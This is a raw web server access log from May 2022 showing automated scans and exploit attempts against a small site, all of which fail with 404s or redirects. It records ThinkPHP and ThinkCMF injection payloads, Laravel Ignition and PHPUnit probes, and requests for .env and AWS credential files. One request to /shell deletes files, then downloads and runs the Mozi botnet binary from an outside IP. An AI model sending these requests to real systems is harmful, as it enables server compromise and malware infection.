[18/May/2022 03:48:04] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 2222
[18/May/2022 04:16:07] "GET / HTTP/1.0" 302 0
[18/May/2022 04:16:08] "GET / HTTP/1.0" 302 0
[18/May/2022 04:16:09] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /index.php
[18/May/2022 04:31:22] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 2294
[18/May/2022 05:01:01] "GET / HTTP/1.0" 302 0
[18/May/2022 05:01:01] "GET /public/index.html HTTP/1.0" 200 2139
[18/May/2022 05:05:32] "GET / HTTP/1.0" 302 0
[18/May/2022 05:05:32] "GET /public/index.html HTTP/1.0" 200 2139
[18/May/2022 05:07:33] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 302 0
[18/May/2022 05:07:35] "GET /public/index.html HTTP/1.0" 200 2139
[18/May/2022 05:44:42] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 302 0
[18/May/2022 05:44:43] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /console/
[18/May/2022 06:19:00] "GET /console/ HTTP/1.0" 404 2172
Not Found: /Autodiscover/Autodiscover.xml
[18/May/2022 06:36:32] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 2236
[18/May/2022 06:37:27] "GET / HTTP/1.0" 302 0
[18/May/2022 06:49:11] "GET / HTTP/1.0" 302 0
[18/May/2022 07:11:45] "GET / HTTP/1.0" 302 0
[18/May/2022 07:11:46] "GET /public/index.html HTTP/1.0" 200 2139
[18/May/2022 07:22:54] "GET / HTTP/1.0" 302 0
[18/May/2022 07:22:54] "GET /public/index.html HTTP/1.0" 200 2139
[18/May/2022 07:22:54] "GET /public/favicon.ico HTTP/1.0" 200 22382
Not Found: /_ignition/execute-solution
[18/May/2022 07:25:19] "GET /_ignition/execute-solution HTTP/1.0" 404 2226
[18/May/2022 07:53:50] "GET / HTTP/1.0" 302 0
[18/May/2022 07:53:51] "GET /public/index.html HTTP/1.0" 200 2139
[18/May/2022 08:24:00] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:08] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:08] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:13] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 08:38:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /admin/config.php
[18/May/2022 08:51:24] "GET /admin/config.php HTTP/1.0" 404 3928
[18/May/2022 09:27:41] "GET / HTTP/1.0" 302 0
[18/May/2022 09:32:09] "GET / HTTP/1.0" 302 0
[18/May/2022 09:32:20] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /actuator/gateway/routes
[18/May/2022 09:52:11] "GET /actuator/gateway/routes HTTP/1.0" 404 2217
[18/May/2022 10:19:30] "GET / HTTP/1.0" 302 0
Not Found: /.env
[18/May/2022 10:43:00] "GET /.env HTTP/1.0" 404 2160
[18/May/2022 10:43:00] "POST / HTTP/1.0" 302 0
[18/May/2022 11:07:01] "HEAD / HTTP/1.0" 302 0
[18/May/2022 12:06:25] "GET / HTTP/1.0" 302 0
[18/May/2022 12:06:25] "GET /public/index.html HTTP/1.0" 200 2139
[18/May/2022 12:07:10] "GET / HTTP/1.0" 302 0
[18/May/2022 12:07:11] "GET /public/index.html HTTP/1.0" 200 2139
[18/May/2022 12:22:34] "GET / HTTP/1.0" 302 0
[18/May/2022 12:44:23] "GET / HTTP/1.0" 302 0
[18/May/2022 12:44:23] "GET /public/index.html HTTP/1.0" 200 2139
[18/May/2022 12:45:17] "GET / HTTP/1.0" 302 0
Not Found: /HNAP1/
[18/May/2022 12:45:18] "POST /HNAP1/ HTTP/1.0" 404 2167
[18/May/2022 12:45:54] "GET / HTTP/1.0" 302 0
[18/May/2022 13:18:17] "GET / HTTP/1.0" 302 0
[18/May/2022 13:47:20] "GET / HTTP/1.0" 302 0
[18/May/2022 13:47:20] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:45] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:46] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:47] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:47] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:51] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:51] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:52] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:54] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 14:23:55] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[18/May/2022 14:49:23] "GET / HTTP/1.0" 302 0
[18/May/2022 15:30:58] "HEAD / HTTP/1.0" 302 0
[18/May/2022 15:48:42] "GET / HTTP/1.0" 302 0
[18/May/2022 15:48:42] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /HNAP1/
[18/May/2022 15:48:43] "GET /HNAP1/ HTTP/1.0" 404 2166
Not Found: /.env
[18/May/2022 15:51:41] "GET /.env HTTP/1.0" 404 2160
Not Found: /vendor/.env
[18/May/2022 15:51:42] "GET /vendor/.env HTTP/1.0" 404 2181
Not Found: /storage/.env
[18/May/2022 15:51:42] "GET /storage/.env HTTP/1.0" 404 2184
[18/May/2022 15:51:43] "GET /public/.env HTTP/1.0" 404 1634
[18/May/2022 15:51:43] "POST / HTTP/1.0" 302 0
Not Found: /.env
[18/May/2022 16:11:37] "GET /.env HTTP/1.0" 404 2160
[18/May/2022 16:26:33] "GET / HTTP/1.0" 302 0
[18/May/2022 16:26:34] "GET /public/index.html HTTP/1.0" 200 2139
[18/May/2022 16:51:38] "GET / HTTP/1.0" 302 0
[18/May/2022 17:23:07] "GET / HTTP/1.0" 302 0
[18/May/2022 17:23:07] "GET /public/index.html HTTP/1.0" 200 2139
[18/May/2022 17:51:17] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[18/May/2022 19:45:55] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:45:56] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:45:57] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:45:58] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:45:59] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:46:00] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:46:01] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:46:02] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:46:03] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:46:04] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:46:05] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:46:06] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:46:07] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:46:08] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:46:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:46:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:46:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[18/May/2022 19:46:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /.aws/credentials
[18/May/2022 19:48:40] "GET /.aws/credentials HTTP/1.0" 404 2196
[18/May/2022 19:54:34] "GET / HTTP/1.0" 302 0
[18/May/2022 19:54:36] "GET /public/index.html HTTP/1.0" 200 2139
[18/May/2022 21:11:15] "GET / HTTP/1.0" 302 0
[18/May/2022 21:11:15] "GET /public/index.html HTTP/1.0" 200 2139
[18/May/2022 22:20:19] "GET / HTTP/1.0" 302 0
[18/May/2022 22:21:57] "HEAD / HTTP/1.0" 302 0
[18/May/2022 22:30:17] "GET / HTTP/1.0" 302 0
[18/May/2022 22:30:17] "GET /public/index.html HTTP/1.0" 200 2139
[18/May/2022 22:30:18] "GET /public/favicon.ico HTTP/1.0" 200 22382
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[18/May/2022 22:48:56] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2299
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[18/May/2022 23:15:02] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
[18/May/2022 23:19:30] "GET / HTTP/1.0" 302 0
[18/May/2022 23:19:31] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /solr/admin/info/system
[18/May/2022 23:31:55] "GET /solr/admin/info/system?wt=json HTTP/1.0" 404 2222
[18/May/2022 23:51:20] "GET / HTTP/1.0" 302 0
Not Found: /index.php
[18/May/2022 23:59:51] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 2294
[19/May/2022 00:00:49] "GET / HTTP/1.0" 302 0
[19/May/2022 00:00:50] "GET /public/index.html HTTP/1.0" 200 2139
[19/May/2022 00:02:27] "GET / HTTP/1.0" 302 0
[19/May/2022 00:21:26] "GET / HTTP/1.0" 302 0
[19/May/2022 00:21:26] "GET /public/index.html HTTP/1.0" 200 2139
[19/May/2022 00:21:27] "GET /public/favicon.ico HTTP/1.0" 200 22382
Not Found: /shell
[19/May/2022 00:34:09] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://171.119.236.202:48968/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 2255
[19/May/2022 00:50:08] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 302 0
[19/May/2022 00:50:12] "GET /public/index.html HTTP/1.0" 200 2139
[19/May/2022 01:20:45] "GET /public/favicon.ico HTTP/1.0" 200 22382
[19/May/2022 01:43:06] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 302 0
[19/May/2022 01:43:10] "GET /public/index.html HTTP/1.0" 200 2139
[19/May/2022 01:53:58] "POST / HTTP/1.0" 302 0
[19/May/2022 01:53:58] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /.env
[19/May/2022 01:53:59] "GET /.env HTTP/1.0" 404 2160
Not Found: /vendor/.env
[19/May/2022 01:53:59] "GET /vendor/.env HTTP/1.0" 404 2181
Not Found: /admin/.env
[19/May/2022 01:54:00] "GET /admin/.env HTTP/1.0" 404 3910
Not Found: /14.225.16.78/.env
[19/May/2022 01:54:01] "GET /14.225.16.78/.env HTTP/1.0" 404 2199
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[19/May/2022 01:54:01] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2298
Not Found: /console/
[19/May/2022 02:22:21] "GET /console/ HTTP/1.0" 404 2172
Not Found: /Autodiscover/Autodiscover.xml
[19/May/2022 02:45:53] "POST /Autodiscover/Autodiscover.xml HTTP/1.0" 404 2236
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:45] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:45] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:46] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:47] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:30:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 03:42:28] "GET /_ignition/execute-solution HTTP/1.0" 404 2226
[19/May/2022 03:52:53] "GET / HTTP/1.0" 302 0
[19/May/2022 03:52:59] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /.env
[19/May/2022 03:55:13] "GET /.env HTTP/1.0" 404 2160
[19/May/2022 03:55:14] "POST / HTTP/1.0" 302 0
[19/May/2022 04:21:45] "HEAD / HTTP/1.0" 302 0
Not Found: /system_api.php
[19/May/2022 04:21:46] "GET /system_api.php HTTP/1.0" 404 2190
Not Found: /c/version.js
[19/May/2022 04:21:47] "GET /c/version.js HTTP/1.0" 404 2184
Not Found: /streaming/clients_live.php
[19/May/2022 04:21:48] "GET /streaming/clients_live.php HTTP/1.0" 404 2226
Not Found: /stalker_portal/c/version.js
[19/May/2022 04:21:49] "GET /stalker_portal/c/version.js HTTP/1.0" 404 2229
Not Found: /stream/live.php
[19/May/2022 04:21:50] "GET /stream/live.php HTTP/1.0" 404 2193
Not Found: /flu/403.html
[19/May/2022 04:21:52] "GET /flu/403.html HTTP/1.0" 404 2184
[19/May/2022 04:21:53] "GET / HTTP/1.0" 302 0
[19/May/2022 04:21:53] "GET /public/index.html HTTP/1.0" 200 2139
[19/May/2022 04:58:37] "GET / HTTP/1.0" 302 0
[19/May/2022 05:14:28] "GET / HTTP/1.0" 302 0
[19/May/2022 05:29:07] "GET / HTTP/1.0" 302 0
[19/May/2022 05:29:35] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /HNAP1/
[19/May/2022 05:29:36] "GET /HNAP1/ HTTP/1.0" 404 2166
Not Found: /actuator/gateway/routes
[19/May/2022 06:04:50] "GET /actuator/gateway/routes HTTP/1.0" 404 2217
Not Found: /.env
[19/May/2022 07:30:32] "GET /.env HTTP/1.0" 404 2160
[19/May/2022 07:40:22] "GET / HTTP/1.0" 302 0
Not Found: /phpmyadmin/scripts/setup.php
[19/May/2022 07:42:19] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 2232
[19/May/2022 08:51:16] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:23] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:24] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:25] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:26] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:27] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:28] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:29] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:30] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:31] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:31] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:32] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:33] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 09:05:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[19/May/2022 09:18:17] "GET / HTTP/1.0" 302 0
[19/May/2022 09:18:17] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /portal/redlion
[19/May/2022 09:50:24] "GET /portal/redlion HTTP/1.0" 404 2190
Not Found: /hudson
[19/May/2022 10:19:22] "GET /hudson HTTP/1.0" 404 2166
[19/May/2022 10:25:31] "GET / HTTP/1.0" 302 0
[19/May/2022 10:25:31] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /wp-includes/js/jquery/jquery.js
[19/May/2022 10:25:31] "GET /wp-includes/js/jquery/jquery.js HTTP/1.0" 404 2241
Not Found: /administrator/help/en-GB/toc.json
[19/May/2022 10:25:32] "GET /administrator/help/en-GB/toc.json HTTP/1.0" 404 2247
Not Found: /administrator/language/en-GB/install.xml
[19/May/2022 10:25:32] "GET /administrator/language/en-GB/install.xml HTTP/1.0" 404 2268
Not Found: /plugins/system/debug/debug.xml
[19/May/2022 10:25:33] "GET /plugins/system/debug/debug.xml HTTP/1.0" 404 2238
Not Found: /administrator/
[19/May/2022 10:25:33] "GET /administrator/ HTTP/1.0" 404 2190
Not Found: /misc/ajax.js
[19/May/2022 10:25:34] "GET /misc/ajax.js HTTP/1.0" 404 2184
[19/May/2022 10:25:34] "GET / HTTP/1.0" 302 0
[19/May/2022 10:25:35] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /admin/view/javascript/common.js
[19/May/2022 10:25:35] "GET /admin/view/javascript/common.js HTTP/1.0" 404 3973
Not Found: /admin/includes/general.js
[19/May/2022 10:25:36] "GET /admin/includes/general.js HTTP/1.0" 404 3955
Not Found: /images/editor/separator.gif
[19/May/2022 10:25:36] "GET /images/editor/separator.gif HTTP/1.0" 404 2229
Not Found: /js/header-rollup-554.js
[19/May/2022 10:25:37] "GET /js/header-rollup-554.js HTTP/1.0" 404 2217
Not Found: /vendor/phpunit/phpunit/build.xml
[19/May/2022 10:25:37] "GET /vendor/phpunit/phpunit/build.xml HTTP/1.0" 404 2244
Not Found: /fckeditor/editor/filemanager/connectors/php/upload.php
[19/May/2022 10:25:38] "GET /fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media HTTP/1.0" 404 2321
Not Found: /.env
[19/May/2022 10:25:38] "GET /.env HTTP/1.0" 404 2160
[19/May/2022 10:25:39] "GET / HTTP/1.0" 302 0
[19/May/2022 10:25:39] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /wp-admin/setup-config.php
[19/May/2022 10:25:40] "GET /wp-admin/setup-config.php?step=0 HTTP/1.0" 404 2230
Not Found: /wordpress/wp-admin/setup-config.php
[19/May/2022 10:25:40] "GET /wordpress/wp-admin/setup-config.php?step=0 HTTP/1.0" 404 2260
Not Found: /wp/wp-admin/setup-config.php
[19/May/2022 10:25:41] "GET /wp/wp-admin/setup-config.php?step=0 HTTP/1.0" 404 2239
Not Found: /blog/wp-admin/setup-config.php
[19/May/2022 10:25:41] "GET /blog/wp-admin/setup-config.php?step=0 HTTP/1.0" 404 2245
Not Found: /test/wp-admin/setup-config.php
[19/May/2022 10:25:42] "GET /test/wp-admin/setup-config.php?step=0 HTTP/1.0" 404 2245
Not Found: /site/wp-admin/setup-config.php
[19/May/2022 10:25:42] "GET /site/wp-admin/setup-config.php?step=0 HTTP/1.0" 404 2245
Not Found: ///.env
[19/May/2022 10:36:26] "GET ///.env HTTP/1.0" 404 2166
[19/May/2022 12:04:37] "GET / HTTP/1.0" 302 0
[19/May/2022 12:04:37] "GET /public/index.html HTTP/1.0" 200 2139
[19/May/2022 12:51:47] "GET / HTTP/1.0" 302 0
[19/May/2022 13:26:04] "GET / HTTP/1.0" 302 0
Not Found: /HNAP1/
[19/May/2022 13:26:04] "POST /HNAP1/ HTTP/1.0" 404 2167
[19/May/2022 13:28:43] "GET / HTTP/1.0" 302 0
[19/May/2022 13:28:43] "GET /public/index.html HTTP/1.0" 200 2139
[19/May/2022 13:28:44] "GET /public/favicon.ico HTTP/1.0" 200 22382
[19/May/2022 13:28:45] "GET /public/static/js/bundle.js HTTP/1.0" 200 38798
[19/May/2022 13:28:46] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969843
[19/May/2022 13:28:49] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
Not Found: //robots.txt
[19/May/2022 13:29:00] "GET //robots.txt HTTP/1.0" 404 2181
Not Found: //.well-known/security.txt
[19/May/2022 13:29:00] "GET //.well-known/security.txt HTTP/1.0" 404 2223
Not Found: //sitemap.xml
[19/May/2022 13:29:00] "GET //sitemap.xml HTTP/1.0" 404 2184
[19/May/2022 13:37:09] "GET / HTTP/1.0" 302 0
[19/May/2022 13:37:09] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /fuN3
[19/May/2022 13:56:15] "GET /fuN3 HTTP/1.0" 404 2168
[19/May/2022 14:23:16] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[19/May/2022 14:38:46] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:07] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:08] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:09] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:10] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:11] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:12] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[19/May/2022 14:39:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[19/May/2022 15:15:05] "GET / HTTP/1.0" 302 0
[19/May/2022 15:15:05] "GET /public/index.html HTTP/1.0" 200 2139
[19/May/2022 15:15:06] "GET /public/static/js/bundle.js HTTP/1.0" 200 38798
[19/May/2022 15:15:06] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.0" 200 96134
[19/May/2022 15:15:06] "GET /public/assets/theme/blue/theme-dark.css HTTP/1.0" 200 197075
[19/May/2022 15:15:06] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969843
[19/May/2022 15:15:06] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
Not Found: /sockjs-node
[19/May/2022 15:15:09] "GET /sockjs-node HTTP/1.0" 404 2181
[19/May/2022 15:15:09] "GET /api/authentication/getUser HTTP/1.0" 200 71
[19/May/2022 15:15:09] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
[19/May/2022 15:15:09] "GET /admin/login?next=http%3A%2F%2F14.225.16.78%2Fpublic%2Findex.html%23%2F HTTP/1.0" 301 0
